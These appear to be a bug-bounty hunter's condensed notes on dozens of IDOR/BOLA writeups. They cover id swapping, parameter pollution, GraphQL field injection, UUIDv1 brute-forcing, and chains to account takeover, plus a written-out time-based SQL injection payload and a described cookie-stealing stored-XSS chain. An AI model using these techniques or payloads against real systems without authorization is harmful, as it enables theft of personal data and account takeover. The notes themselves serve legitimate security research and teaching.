# Phase 1 — Medium IDOR writeups: distilled lesson cards


### [01] Logic IDOR → private photos via predictable "unguessable" OwnerId — Hamzadzworm (private program)
- Surface: private photo upload app; share-photo API took `OwnerId` (12-digit) + email as params. Missing email verification (can register any email).
- Looked: created MULTIPLE accounts w/ temp emails, diffed the generated OwnerIds. Saw first 9 digits patterned, last 3 constant. Then used email **aliases** (john+1@, john+2@) and saw first 7 digits derive from the email username; only 2 middle digits vary.
- Tested: from attacker acct, called share endpoint with victim's OwnerId → app shared the victim's photos (action/write IDOR). To get victim OwnerId: register `victim+1@victimdomain` (no verification) → inherit same first 7 digits → brute-force just 2 middle digits.
- Oracle: victim's photo shared but "shared by" = attacker.
- Lesson/Q: A long random ID is NOT safe if it's **derived from attacker-controllable input** (email/username/timestamp). ALWAYS: create N accounts, diff IDs, look for structure; abuse `+alias` emails to align prefixes. Q: "Is this ID a hash/sequence of something I control? Can I make the victim's ID collide with a prefix I can generate?"

### [02] IDOR → ATO via email reassignment on profile update — Damian Gambacorta ($4000, credit bureau)
- Surface: REST API `POST /api/v1/user/update` (bearer auth) with JSON body {firstName,email,secondEmail,address,phones}.
- Looked: profile-update endpoints are goldmines — they take many user fields and write the record. Core question: does server pick the target user from the TOKEN or from a client-supplied field?
- Tested: set `"email":"victim@x"` + `"secondEmail":"attacker@x"` with attacker token → server used the body `email` as the LOOKUP KEY, updated victim's record. Then triggered password recovery → reset link sent to ALL registered emails incl. attacker's secondary → full ATO. (Also: changing own email to another's was accepted w/ no verification; mass-assign role fields were ignored.)
- Oracle: success response; recovery email arrives at attacker address.
- Lesson/Q: mutable data (email/phone) used as a record identifier = IDOR. Chain IDOR on **account-recovery attributes** → ATO. Q: "Which body field is the lookup key? What does each writable field *enable* (email = key to password reset)?" Watch for unverified secondary/recovery email = silent ATO primitive.

### [03] 10 manual IDOR test-cases (methodology) — SAYEM-EH
- T1 ADD an id param to requests that lack one: `GET /api/MyPictureList` → `?user_id=<other>`. Find param NAMES by editing/deleting other objects and observing the param used.
- T2 REPLACE param name: `?album_id=` → `?account_id=` (Burp Paramalyzer remembers all params seen on a host).
- T3 HPP: `?id=<me>&id=<admin>` (authz reads one copy, data layer the other).
- T4 METHOD swap: POST↔PUT, GET→POST/PUT/DELETE to reach create/update/delete.
- T5 CONTENT-TYPE swap: xml↔json, also `text/xml`, `text/x-json` (authz often inconsistent per content-type).
- T6 FILE-EXT: `/user_data/2341`→401 vs `/user_data/2341.json`→200 (Rails/Ruby). Try `.json/.xml/.config`.
- T7 NUMERIC where non-numeric expected: `username=user1`→`1234`, `account_id=<UUID>`→`5678` (multiple ref schemes, authz only on one).
- T8 ARRAY-wrap: `{"id":19}`→`{"id":[19]}`.
- T9 WILDCARD: `/api/users/<id>/` → `/api/users/*`.
- T10 NEW features (e.g. `/api/CharityEventFeb2021/user/pp/<ID>`) skip access control more often than core features.

### [05] BOLA = API IDOR (concept) — Nitin yadav / kd-200
- `GET /api/v2/accounts/8842/transactions` → 8843. APIs prone because devs assume "API is internal / only the app calls it" — false: you call it directly in Burp.
- Method: 2 accounts, capture A's object calls, swap B's ids; ALSO retry with NO auth token at all (sometimes still works → worse).
- Non-obvious ids: UUID (find where it LEAKS — other API responses, public profiles, referral links), base64 (decode→change→re-encode), ids in headers/JSON body.
- Q: "If the id looks unguessable, where does the app HAND it to me for free?"

### [06] Swiggy invoice IDOR (Critical, dup-report) — Binu B
- Surface: order-history invoice download link carried a `token` param. Swapped own order number → got ANOTHER user's invoice PDF (delivery address, payment info, order details), unauthenticated.
- Lesson/Q: invoice/receipt/export/download links are prime IDOR. Sequential id = red flag → ask: authenticated? rate-limited? enumerable? what data? Frame impact "at scale" (millions of invoices). Where to look: order history → download/print/receipt endpoints.

### [07] Why AI-generated APIs are IDOR factories — Charles Kern (defensive, but a hunting heuristic)
- Pattern: Cursor/Claude write `authenticate` middleware but omit the per-object ownership check in EVERY resource handler: `app.get('/api/documents/:id', authenticate, ()=>Document.findById(req.params.id))` — authenticated, never checks `doc.userId===req.user.id`.
- Audit/recon: grep/semgrep for `findById`/`findOne`/`findByPk`/ORM fetch NOT followed by an ownership assertion in the same function.
- Hunting heuristic/Q: "Does this look AI-built / vibe-coded SaaS? Then test EVERY `/api/<resource>/:id` route — the ownership check is probably missing on all of them." Note: 404-vs-403 leak — a 404 for "exists but not yours" still confirms valid ids.

### [04] IDOR primer + where-to-hunt list — Nitin yadav / kd-200
- Where to hunt (any id/reference): `/user/1234`, `/order/5500`, `/invoice/download?id=900`, `/api/account/abc123`, hidden body fields (`account_id`,`uid`,`file`).
- Two-account trick for bulletproof PoC (A reads B's id=1001). "Lazy hunters skip the non-obvious ids (base64/headers/JSON) — that's your opening." Reinforces: decode everything, poke every id.

### [08] $900 IDOR on form attachments via direct download API — Abhi Sharma (a13h1)
- Surface: SaaS People/Form system. Tested as a **Viewer** role that in UI ❌ can't access forms/submissions/attachments.
- Looked: watched network traffic, saw downloads go through a direct endpoint. Thought: "what if the backend only checks the attachment ID, not my permissions?"
- Tested: `GET /form_submission_value/{attachment_id}/attachments?attachment_name={name}` with viewer session → **200 + file** despite zero UI access. attachment_id sequential, attachment_name guessable, no rate limit → enumerable.
- Lesson/Q: pick the LOWEST-priv role as your test identity, then ask "what can the UI NOT do for me that the API still does?" Always test direct download/media/attachment endpoints. Don't stop at "need one extra param" — prove enumeration (turns Medium→High). "If I can't access it in UI, can I still fetch it directly?"

### [09] IDOR despite NON-enumerable (random/ULID) ids — KreSec (private, ~$9k w/ partner on another)
- Surface: SaaS page-builder; delete-element endpoint had no authz. ids were ULIDs like `01kk0wtaeyfck1ft4v07ptnxb0` (devs treated "random" as the security layer).
- KEY META-LESSON: a 2-account IDOR on random ids gets marked **Informative/NA** ("how would an attacker guess the id?", CVSS AC:High). Beat the triager to it — ANSWER that question yourself FIRST.
- How: ask "where is this id used / exposed / referenced?" Filter Burp HTTP-history by the id string → found the random id (=`websiteId`) reused across publish/custom-domain/**live homepage** endpoints AND rendered on the front-end. The `componentId` came from `.tsx`/`data-*` attributes exposed in DOM after CSR render.
- Exploit becomes near 0-click: open target site → wait render → scrape `websiteId` + element id from DOM → send delete (loop defeats the "revert" feature).
- Lesson/Q: random id ≠ safe. "Where does the app HAND this id back to me — other endpoints, published/public pages, DOM `data-*`, JS bundles, exports, emails?" CSR/React apps leak object ids in rendered HTML attributes. Always frame enumerability to dodge Informative.

### [10] Chain: client-side KYC bypass → authed SQLi → double IDOR (create+delete) — elcezeri
- KYC gate = weak client-side redirect: register → intercept redirect `…/public/kyc-approval?customerId=X&redirect_uri=/public/profile` → change URL to the profile path and STOP page load before redirect → full authed dashboard without KYC. Persist with a Burp match/replace rule swapping verify-URL→profile-URL on every request.
- Then on authed API `POST /api/case`, the `…Id` param was SQLi (`'XOR(if(now()=sysdate(),sleep(4),0))XOR'Z` → 4s delay).
- Double IDOR: `POST /api/case` change ownerId→victim (create/update records AS any user); `POST /api/case/[ID]/delete` change id→victim (delete others' records, no owner check).
- Lesson/Q: "Is this onboarding/KYC/verify gate server-enforced or just a client redirect I can skip?" Skipping a gate opens a deeper authed API that's frequently riddled with BOLA + injection. The owner-id param in create/update endpoints = mass-IDOR write.

### [11] Burp-for-IDOR beginner guide — Ekene Joseph (reinforcement)
- Proxy 127.0.0.1:8080 → intercept → send to Repeater → flip `id/user/account/document` params and diff responses. Use Repeater for fast comparison without browser refresh. (No novel technique; basics only.)

### [13] CTF "Angry Teacher": secret-in-source + BOLA — Razzle Mouse
- Stack: React + Node/Express + SQLite + nginx. `PUT /api/grades/:studentId/:gradeId` validates an API key but never checks the key owns that grade = BOLA.
- Recon chain: View-Source → API key sitting in an HTML comment (`<!-- API_KEY: sk_... -->`, CWE-615). login response returns `grade_ids:[1,2,3,4]` (object enumeration from the response body). Unknown auth-header FORMAT recovered by grepping the compiled bundle `main.<hash>.js` for a `console.log` breadcrumb showing the exact `fetch()` call → confirmed raw key, no `Bearer` (backend does `req.headers.authorization === storedKey`).
- Lesson/Q: client side is recon gold — "Does page source / inline JS / compiled bundle / source map / console.log leak credentials, API keys, internal endpoint shapes, or the exact request format?" Auth (valid key) ≠ Authz (owns this object). Object id in path = the only (missing) control.

### [12] IDOR in low-code/OutSystems = client-side-only validation — Lucas Soares
- Pattern: devs validate in the **ClientAction** then call a **ServerAction** that executes with no checks. A URL screen-param (`Edit=true`) toggles privileged UI (a delete icon appears). Intercept the delete request, change `requestId=56` (not yours) → server action deletes it (no owner check).
- Lesson/Q: in low-code (OutSystems/etc.), "is the authz only client-side while the server action runs unchecked?" Toggle screen input params in the URL to unlock hidden privileged actions, then swap the record id. Tool: OutSystems-Analyzer (open-source) enumerates screen input params + server calls. (Context: Meta paid >$10k for IG/WhatsApp API IDORs in 2025.)

### [14] CTF Galaxy Dash: UUID leaked by a status endpoint — ayed djalil
- Delivery app; your booking id is a UUID (`/api/bookings/<uuid>/tracking`). The `/api/network/status` endpoint returns a `recent_shipments[]` array containing OTHER users' `tracking_id` UUIDs → feed those into the per-booking endpoint.
- Lesson/Q: UUID ≠ safe when a global/status/feed/recent/dashboard endpoint enumerates objects beyond yours. ALWAYS hunt a "list everything" endpoint that hands you other users' ids. Q: "Is there a `/status`,`/recent`,`/feed`,`/all`,`/network` endpoint returning objects I don't own?"

### [15] IDOR primer (ID) — Gama Waskita (reinforcement only)
- `invoice?id=0001`→`0002`; OWASP 2025 BAC #1. Prevent w/ server-side authz, least privilege, centralized middleware. (No novel technique.)

### [16] $500 "valid-pair replay" IDOR on seller-review (new feature) — Musab Sarı
- NEW feature: customers review sellers. `POST` review body has `customerId` + `orderId`. Changing only `customerId` → server: "customerId and orderId should match" (it validates the PAIR is consistent). Trick: make a 2nd account and replay the ORIGINAL valid `customerId/orderId` pair using the **2nd account's session/cookie** → 200 OK. Server checks the two ids match each other but NOT that the caller owns them.
- Lesson/Q: when an endpoint enforces "these two ids are consistent," it often still skips "does the SESSION own them" — replay a known-valid pair under a different session. Hunt NEW features first (weaker authz). Mindset: IDOR is about understanding every endpoint/function over many hours, not just incrementing numbers.

### [17] Helium CTF: IDOR-write → stored XSS in others' content → mass ATO — Caesar Evan
- `PUT /api/jobs/{id}` no authz (enumerate others via `GET /api/jobs/11`) → overwrite other users' job posts. Fields title/description/requirements are stored-XSS sinks. Chain: IDOR-write a cookie-stealing payload into MANY posts (Burp Intruder), victims view → cookies to Collaborator → mass ATO. Used 2 roles (Job Seeker + Company).
- Lesson/Q: an IDOR that WRITES to an object OTHER users render turns a self-XSS into a stored/mass XSS watering hole. Q: "Can I IDOR-write into content that other users view? Then plant stored XSS there → mass session hijack."

### [18] AI-generated APIs miss ownership on every route (CWE-639) — Charles Kern (adds to [07])
- Extra: MongoDB ObjectIDs "look random but aren't" (encode timestamp + machine id → enumerable). Audit grep: `grep -rn "req.params\." src/routes/ | grep -v "req.user"`. Admin cross-user access must be an explicit `role==='admin'` branch, not a skipped check. (Consolidate with the AI-codebase heuristic.)

### [19] IDOR types primer — ExploitHunter (reinforcement)
- Horizontal (same-level other user), Vertical (privilege escalation), Indirect-ref issues (encoded/hidden ids still weak). "Checks WHAT is requested, not WHO requests." (No novel technique.)

### [20-21] AI/"vibe-coded" codebases = IDOR everywhere — Charles Kern (adds to [07]/[18])
- Shows up in ~half of vibe-coded projects; same gap across Express/Prisma/FastAPI/Gin/Rails. Prisma `findUnique({where:{id}})` with no ownerId. Don't rely on query-filtering alone as the check (returns null not 403). Check ownership BEFORE business logic. Durable fixes: `findOwned(Model,id,userId)=findOne({_id:id,userId})` helper; a Cursor/Claude rules-file line "verify req.user.id matches the resource owner." → Hunting heuristic: vibe-coded SaaS ⇒ test every `/api/<resource>/:id` (read+update+delete); integer or Mongo ObjectId = enumerable.

### [22] $20k (→$0) mass-PII IDOR from OLD recon + Google dork — Mohaseen
- Method: revisited OLD recon data; read JS files line-by-line. Found an unusual SEPARATE domain `stageredacted.com` (NOT `stage.redacted.com`) in the same ecosystem. Root=404; dir fuzzing found nothing. Google dork `site:*.stageredacted.com` surfaced indexed staging API endpoints. They returned only demo data — UNTIL he replaced the placeholder id with a REAL identifier harvested from the production app → endpoint returned real production PII. Burp Intruder `xxx00–xxx99` → each id = a different user (names, phones, addresses, ID numbers, card data).
- Lesson/Q: "Are there separate-but-related domains (staging/partner/legacy) in recon? Do staging endpoints read PROD data? Am I using a REAL harvested id, not a placeholder?" Mine old recon + JS + `site:` dorks for hidden API endpoints. CAUTION: heavy Intruder burst tripped their SOC → fixed pre-triage → $0. Prove enumeration with a SMALL range, minimal requests.

### [23] PortSwigger lab: sequential file IDOR → creds → ATO — Odunlade Adeola
- Live-chat "View transcript" → `GET /download-transcript/2.txt`. Sent to Repeater: `0.txt`→"No transcript" (oracle: endpoint dynamically serves by number), `1.txt`→another user's transcript containing a PASSWORD → logged in as them.
- Lesson/Q: predictable sequential FILE refs (transcripts/logs/exports/receipts) are pure IDOR; a non-existent id yields a distinct response = your existence oracle. Leaked transcripts/chat logs often contain creds → ATO. "Where does this app store per-user text as a numbered file?"

### [24] GraphQL IDOR via FIELD-injection + id swap → full-base PII — Snehil
- After admin-panel/ports/backend recon failed, went back to basics: captured authed traffic, hit `POST /api/graphql/`. Default `team(id)` query returned name/captain/members. The response SHAPE hinted more fields existed → added `profileData` into `members{}`/`captain{}` → server returned full PII (no field-level authz). Then swapped the `id` variable to other teams; iterate sequentially → dump EVERY user (name,email,phone,parent names,DOB,college,gender,citizen#).
- Lesson/Q: GraphQL = ONE missing resolver check exposes the whole graph. Two moves: (1) ADD sensitive fields the UI didn't request (`profileData`,`email`,`phone`,`permissions`,`address`) — guess from object shape/introspection; (2) swap/iterate the `id` variable. "What fields does this type probably have that the client isn't asking for?" Disable introspection is the fix → so try introspection first.

### [25] IDOR(info-disclosure in JS) + broken reset → ADMIN ATO — El Professor Qais (Bugcrowd)
- JS files revealed `/api/internal/user/InternalUser` → returned admin emails + usernames (internal API, no auth). No password though. Pivoted to reset `/api/public/memberauth/password/forgot/init`. HPP `email=victim,mine` failed; then sent `username=<victim_admin_username>&email=<myemail>` → "status ok" → got the admin's reset email → reset → admin access.
- Lesson/Q: chain (leaked admin identity from JS/internal API) + (reset endpoint that trusts a client-supplied email and never binds it to the account's real email). "Does forgot-password bind email→account server-side, or send the reset to whatever email I pair with a victim username?" Hunt `/internal/`,`/api/internal/*` in JS for admin usernames/emails.

### [26] IDOR exposed billing data (chained) — El Professor Qais [PAYWALL — preview only, retry]
- Member-only; fetch truncated at intro. Theme: BugCrowd public program, older tech stack, IDOR exposing billing addresses + email, later chained. Retry via Freedium/CUA for full method.

### [27] Chained GraphQL BOLA across tenants → workforce analytics + full employee PII + health-data takeover — Mayur Pandya (Thrive Global; Microsoft/Accenture/Adobe data)
- Phase1 recon: company auto-suggest hit public GraphQL `identity.prod…/public`; introspection ENABLED → full schema map. Found `getCompanies` ("returns all PUBLIC companies"). Bypassed the `isPublic` filter by requesting the NESTED `brands` field → server resolved nested data and returned ALL tenants (public+private) with internal UUIDs. (Authz applied at top level, NOT on nested resolver.)
- Phase3: internal endpoint `graph.thriveglobal.com/graphql` had introspection OFF. Browsed every feature → 15,000 Burp requests → built a custom Burp extension to extract unique GraphQL ops and flag ones whose name/vars contain `Id/admin/UUID` → 230 ops, a hit-list. Found `AdminDashboardInsights`/`AdminData`/`AppUsageData` being called in background on the normal dashboard; each took a `companyId`. Backend only checked AUTH, not ADMIN → plugged in Accenture's leaked companyId → full cross-tenant admin analytics (engagement, atRisk employees, retention).
- Phase4: `GetMembersForSocialGroup` returned only displayName/id. Hypothesis: "the only thing stopping me seeing PII is that I'm not ASKING for it." Built custom `DumpAllCompanyEmployees` query adding `user{firstName,lastName,email,attributes}`. Needed a `socialGroupId`: got it by chaining `UserChallenges`→pick team challenge→`GetGroupChallengeSocialGroup(challengeId)`→returns shared `socialGroupId` → dump every employee's PII.
- Phase5: `getHapiToken(email, thriveUserId)` (Human API health integration) = IDOR in token generation → supply victim's email+id → session token → take over victim's health-data connections, inject data.
- Lessons/Qs (GOLDMINE): (1) Always send introspection to every GraphQL endpoint — public one may be open even if internal is closed; the schema reveals hidden ops. (2) Top-level authz often skips NESTED resolvers — request child objects (`brands`, `members`, `user`) to bypass parent filters. (3) Watch background admin queries the UI calls invisibly; if they take a `companyId/tenantId`, swap it (auth≠admin). (4) Excessive data exposure: ADD known fields to a query the UI under-selects. (5) Chain "leak the id" queries to obtain the key the BOLA query needs. (6) Build/automate a GraphQL op-extractor that flags `Id/admin/uuid`. "Fix-and-ghost" risk noted.

### [28] What is IDOR primer — Azama [partial/member-only]
- `user_id-007`→`008`. DevTools Network (F12) to expose API. (Truncated; primer only.)

### [29] "Thinking like an attacker" — vAPI lab IDOR/BOLA — wonderful kamtepa
- Practice on vAPI (github roottusk/vapi). Created users id 8 & 9 via `POST /vapi/api1/user` (note incremental ids). `GET /vapi/api1/user/{id}` → intercept, enumerate id 9→1 in Repeater → other users' data + flag. Prevention list incl. indirect-reference maps, rate-limit + monitoring for sequential probing.
- Lesson/Q: practice lab = vAPI. Endpoints that RETURN user ids are as useful as ones that accept them. Tester mindset: find `{userID}/{transactionID}/{accountNo}` and think how to manipulate; also find endpoints that LEAK ids.

### [30] €500 address IDOR (PrestaShop-style) — delete+reassign any user's address — Mustafa Adam
- `/adresses` mgmt. `POST /adresse?id_address=46061` body `id_address=46061&id_customer=45230&...`. The id sits in BOTH query string AND body, both sequential. Changed BOTH instances of `id_address` to victim's `46063` (kept attacker `id_customer`) → victim address deleted/overwritten + reassigned to attacker. Sequential → enumerate all → mass deletion. Session isolation via PwnFox.
- Lesson/Q: "Does the object id appear in MULTIPLE places (query + body)? Change EVERY instance." Don't trust client `id_customer`. Address/profile CRUD = high-value (delete/overwrite = integrity, not just read). Tool: PwnFox (multi-session). PrestaShop params: `id_customer`,`id_address`.

### [31] IDOR methodology framing (4 questions) — Shivam Bathla
- The 4 questions: can you GET / UPDATE your-or-another user's account, WITH and WITHOUT login? (without login = Broken Authentication; logged-in = Broken Authorization). Vuln code: `acct=request.args.get("acct"); get_user(acct)`. Fix: derive acct from token. Blind IDOR: test across 2 accounts you OWN so you already know the victim's expected values/ids. Lab: OWASP JuiceShop.

### [32] "Thinking like an attacker" (banking API) — Saro Arlene (reinforcement)
- `GET /api/accounts/12345/transactions` → try 12344/12346. Catalog every identifier (numeric/UUID/order ref/doc key) as a low-priv user, then substitute. RED FLAG: parent resource protected but CHILD (`/orders/{id}/details`) not; identifiers in JSON body/headers bypassing URL-param validation. Endpoints that RETURN ids are leads too.

### [33] First IDOR step-by-step — Md Shafiqul (reinforcement + write-test emphasis)
- Read flow: spot `id/user_id/account/order/file/doc` → change → verify (different name/email/orders). THEN test WRITE: `POST /account/update` with victim `user_id` accepted = critical (read-only IDOR bad, write IDOR very bad). Locations: profile, invoice DL, order history, file DL, API, mobile APIs, cloud storage links. Labs: JuiceShop/PortSwigger/THM/DVWA.

### [34] JWT course-access IDOR POC — Arif Rahman (reinforcement)
- JWT `sub`=user id, but `GET /api/courses/{id}` trusts the path id (no enrollment/ownership check). Fix: `findByIdAndUser(courseId, req.user.id)`. Anti-patterns: frontend checks, trusting body `userId`, role-but-not-ownership, "JWT alone is enough." Mantra: JWT ≠ access control.

### [35] $500 UUID-swap via ALTERNATE endpoint route — tinopreter
- Password-manager app, "trusted device" feature. `GET /api/v3/trusted-devices/<UUID>` — naive 2-account UUID swap → **403** (gave up at first!). JS recon for `/api/v3/admin/*` revealed a different shape: `GET /api/v3/members/<UUID>/account/info` (limited info on users you've shared with). Insight: "recook" that route to reach the target object → `GET /api/v3/members/<UUID>/trusted-devices/info` → WORKED → victim's User-Agent, IP, crypto keys. UUIDs leaked in share links.
- Lesson/Q (NOVEL): when the direct object endpoint returns 403, look for a DIFFERENT route to the SAME object — path recomposition `/{collection}/<id>/<subresource>`. Mine JS for sibling/admin/member endpoint shapes and splice the resource you want onto a path that lacks the check. "Is there a second way in to this object that skips the check the first route enforced?"

### [36] $1000 crypto export-CSV IDOR on PUBLIC static domain — Mohsin khan
- "Export order history" generated CSVs hosted on a PUBLIC static domain, NO auth/session. Pattern: `https://static.example.com/order/{type}/export/file/{YYYYMM}/{USER_ID}/Order_history_{DATE}.csv`. Numeric sequential `USER_ID` → enumerate → download anyone's full spot/futures trading history (pairs, leverage, PnL, fees). Some files indexed by search engines.
- Lesson/Q: the export/report FILE often lives on a separate static/CDN host with predictable path and NO auth — test the actual download URL unauthenticated. "Where does the generated file physically live, and does that host check anything?" Check search-engine indexing of those static paths too.

### [38] CTF OopsSec Store: human-readable sequential order id — OopsSec Store (lab)
- Next.js e-commerce; order confirmation `/orders/ORD-004` → `ORD-001` → Bob's order (name, email, delivery address). Human-readable sequential `ORD-NNN`. Lab: `npx create-oss-store`. Fix shows Prisma ownership check. Reinforces: order-confirmation pages + human-readable sequential ids.

### [37] BugForge CTF snippet IDOR — blackm4c (reinforcement)
- Paste/snippet app, public vs private snippets. `GET /api/snippet/<id>` → Burp Intruder id 1–20 → private snippet (flag) at id=4. Snippet/paste/notes apps with public/private split = classic IDOR surface.

### [39] Three IDOR patterns incl. BOOLEAN-flag override — ALR (0xalr)
- F1 (NOVEL): integration endpoint `/api/v1/integration/{slug}` response had `public:false`; cross-team slug → 401. So he ADDED `public=true` as a request parameter → backend treated the object as public and returned it. → "Can I set a `public/isPublic/visibility/shared=true` flag in MY request to unlock a private object?"
- F2: JS endpoint mining — grep all JS for a known base (`/api/v2/integration`) → discover siblings (`/install`,`/configuration`) → then GUESS id-bearing variants (`/install/{id-org|id-workspace}`, plural forms) from app context. Patience → 3 bugs.
- F3: changing slug/id of teams/apps/workspaces/integrations/projects returns data without auth.

### [40] "Beyond IDOR" advanced BAC playbook — Abhishek meena (HIGH VALUE)
- LEAKY-GUID strategy (GUID ≠ access control — just make the app tell you the id): hunt leaked GUIDs in → Mobile API traffic (apps fetch big JSON, render 10% — look for "cousin" objects: same group/org/team); Export features (CSV/PDF metadata embeds every member's GUID); Error messages (register existing email → `{"existing_user_id":"<guid>"}`). Automate with Burp BChecks regex-highlighting UUIDs in responses.
- Cross-tenant "Global Object" mistake: shared objects (system tags, default categories) mixed with private data. Fuzz `GET /api/v1/labels/<id>` — if query is `WHERE id=input` (no `AND tenant_id=...`) you pull other companies' objects.
- Blind IDOR side channels: TIMING (valid id 200ms vs invalid 50ms = server did work before denying) and STATE-CHANGE (DELETE victim id → 200 empty → log into victim, is it deleted/locked?).
- Bypass wrappers: HPP `?user_id=VICTIM&user_id=ATTACKER` (check reads one copy, logic the other); JSON type juggling `{"id":123}`→`{"id":[123]}` (`[123]==123` truthy in JS, dodges deny-lists).

### [41] KYC UUID IDOR + UUIDs harvested from VirusTotal — SudoHunt
- KYC selfie step "continue on phone" via QR → URL was just `https://domain.com/applicants/{uuid}` with NO session auth, NO signature, NO expiry → full KYC (ID-card images, PII, email) to anyone with the UUID.
- WHERE he got the UUIDs (NOVEL recon): queried VirusTotal domain report → found many UUIDs publicly indexed inside uploaded network captures, URLs, logs, scanned files → 10 valid UUIDs. → "Are object UUIDs/URLs leaked on VirusTotal / URLScan / GitHub / pastebin? Query VT domain report, urlscan.io." QR / mobile-handoff flows often use unauth'd UUID URLs.

### [42] Stored XSS in uploaded resume + IDOR on file path — Josekutty
- Career section: upload CV (PDF/DOC). Uploaded a PDF carrying an XSS payload → "View uploaded resume" rendered it → stored XSS fired. File URL: `/media/user_details/431879/resume.pdf` (numeric id). `431878`→404; Burp Intruder 430000–440000 → multiple 200 OK = other users' resumes. Tip: if no "open file" button, right-click→open in new tab to find the upload path.
- Lesson/Q: "Does the uploaded-file URL embed a user/object id I can iterate? Can I store XSS INSIDE an uploaded file (PDF)?" File/media stores are double trouble (IDOR + stored XSS).

### [43] IDOR returns plaintext creds + id=1 = admin ATO — Amit Dutta
- Tiny app; after signup it called `…/php?intr=SA8920980&msg=4&id=1138071`. Incrementing `id` (…71→72) returned ANOTHER user's username AND password (creds in the response!). Login → full PII + bank details. Then `id=1` → admin credentials → admin ATO in one shot.
- Lesson/Q: read the response for CREDENTIALS, not just PII. Always try `id=1` / lowest id (often the admin/first account). Endpoints with stray params (`intr`,`msg`,`id`) post-signup deserve a swap.

### [44] ATO via unaccepted team-invite "association" — elcezeri
- Reservation/team platform. Direct `/user/801910/basic`→`/user/801916/basic` was BLOCKED (no data, no existence hint). Pivot: "Create Team" → invite members by email. Inviting a user made their profile viewable/editable from admin (they're "associated"). Trick: invited the victim's account to his team — NO acceptance required — then `/user/<victimID>/basic` worked → view/edit victim profile → ATO with just their email.
- Lesson/Q (NOVEL logic): when direct object access is blocked, CREATE an association first (invite to team / add as member / share resource) — even unaccepted — then retry; the pending relationship is often treated as authorization. "Can I manufacture a relationship to the victim that the access check honors?"

### [45] IDOR user info disclosure — shahdmk99 [RETRY — Exa no content]

### [46-54] THM "Santa's Little IDOR" (AoC2025 Day 5, TryPresentMe) — CONSOLIDATED (9 authors, same lab: wajidmir1111, securx4, fazal-sec, devdebug, +sudarshan/TRedEye/alina/ashrafdesai/sunjid)
- Teaches FOUR id-obfuscation flavors of the same IDOR (great training taxonomy):
  1. PLAIN id in CLIENT STORAGE: `auth_user` object in **localStorage** holds `user_id`; the `view_accountinfo` request uses it. Edit localStorage `user_id` 10→11→…(15 = parent w/ 10 children) → other users' data. KEY: the id may live in localStorage/sessionStorage/cookie, NOT the URL.
  2. BASE64 id: view-child request `?id=Mg==` (= base64 "2"). Decode → change → re-encode (`Mw==`=3).
  3. HASHED id: edit-child request `child=<md5>`. Use a hash-identifier; if the hash is of a guessable input (the integer id), REPLICATE the hash to forge other ids. (Hashing an enumerable value ≠ protection.)
  4. UUIDv1 token: voucher codes are UUID **v1** = timestamp+clock-seq+MAC → predictable. Know the generation window (e.g. 20:00–24:00 = 240 per-minute candidates) → generate all UUIDv1 for that window → brute `POST /parents/vouchers/claim`.
- Theory worth keeping: authz cannot precede authn (each request re-authenticates via session/cookie); IDOR is usually HORIZONTAL privesc; fix = per-request server-side ownership check ("SDOR"); a co-author argues the better name is "Authorization Bypass" (obscuring the ref doesn't fix it).
- Reusable Qs: "Is the object id in localStorage/sessionStorage/cookie?" · "Is this 'random' value just base64/hex/hash of a small input I can reproduce?" · "Is this a UUIDv1 (time-based) I can brute by timestamp?" Tools: UUID decoder, hash-identifier, Burp Intruder.

### [55] ASP.NET success-page IDOR via Google dork — 4osp3l
- Recon: dork `site:*.example.com ("login"|"signup"|"register"|"logout"|"signin")` to find user-data-handling pages. Submitted a PII form → redirected to `https://www.example.com/public_success.aspx?Id=1000` which DISPLAYED his PII → changed `Id` 1000→1→2 → other users' PII (Broken Access Control).
- Twist: triager "can't reproduce" — the PII only rendered in certain browsers/environments (outdated browser / some Unix setups didn't render it). He documented env differences → accepted.
- Lesson/Q: "After submitting a form, does the success/confirmation page carry an `?Id=` that leaks MY data — and others' when iterated?" Dork for PII pages; `.aspx?Id=` success pages are prime. Repro can be ENVIRONMENT-dependent — capture exact browser/OS in the report.

### [45] Chained multi-API IDOR (partial redaction ≠ authz) — Shahd Qishta (Intercom-style)
- User-info API needs a hard-to-guess `user_id`; attacker has no perms → useless alone. BUT no-role-visible APIs leak the NEXT id at each step (devs redacted only "important" fields, left id fields): `/api/conversations?app_id=X` → leaks `conversation_id` → `/api/conversation_parts?...&conversation_id=` → leaks `conversation_part_id` → `/api/cono/participants/part?...&conversation_id=&conversation_part_id=` → leaks `user_id` → `/api/users/<user_id>` → full PII.
- Lesson/Q (NOVEL): walk a CHAIN where each partially-redacted API response leaks the identifier the next one needs — from a public object down to a private user id. "Partial field redaction is not access control." "Can I pivot public→private by collecting one id at a time across endpoints?"

### [56] Image-downloader IDOR + filename RECONSTRUCTION — Shafayat Alif (YesWeHack)
- Bg-removal tool stores uploads 30 days. `GET /ImageDownload/?docName=<file>.jpeg` — swap filename → others' images (2-acct proof). Triager: "prove how an attacker gets another's filename." Filename = `<6-digit incrementing ID>_<UserName from signup>_<unix timestamp>.jpeg`. Built a generator: enumerate IDs in reverse + descending timestamps → hundreds of candidates → request, drop 404/403, keep 200 → real users' files.
- Lesson/Q (NOVEL): when a file ref looks "unguessable," decompose it — is it `id + username + timestamp`? Each part is predictable → SCRIPT a candidate generator. Beats the "you'd need the exact filename" triage objection. "What are the pieces of this filename and which are sequential/known/time-based?"

### [57] IDOR → RCE on a code-exec platform — Iski [PAYWALL — preview only, retry]
- Member-only, truncated at Act 1. Theme: dev platform "CodeFlow"; robots.txt leaked hidden admin/debug URLs; basic IDOR (profile pics) escalated step-by-step to RCE via the "secure code execution" env. Retry for full chain. Headline: check robots.txt for admin/debug; IDOR on a code-runner can ladder to RCE.

### [58] Fixing IDOR in Flask (defensive, good test recipe) — Kay Adelaja
- `GET /profile?user_id=42`→43 (trusts `request.args`). Fix: scope query by `current_user.id` (`Profile.query.filter_by(user_id=current_user.id)`), centralize in `get_profile_for_user`. Multi-tenant: swapping `account_id/org_id/tenant_id` = cross-tenant leak. TEST RECIPE: login A → capture → replay as B changing ids/tenant/email/username/slug. Watch BULK endpoints (exports, listings) with no scoping/rate-limit. Labs: Project Yggdrasil.

### [60] Alteryx Server IDOR (CVE-2025-63291) — dual-ID MongoObjectID → API key theft — Aleksa Zatezalo
- `GET /api/v1/profile?userID=<MongoObjectID>&subscriptionID=<MongoObjectID>` — swap BOTH to a victim's (obtained from any workflow shared with you) → response leaks victim's Private Studio API Keys + admin API Keys → use keys for admin actions/data exfil.
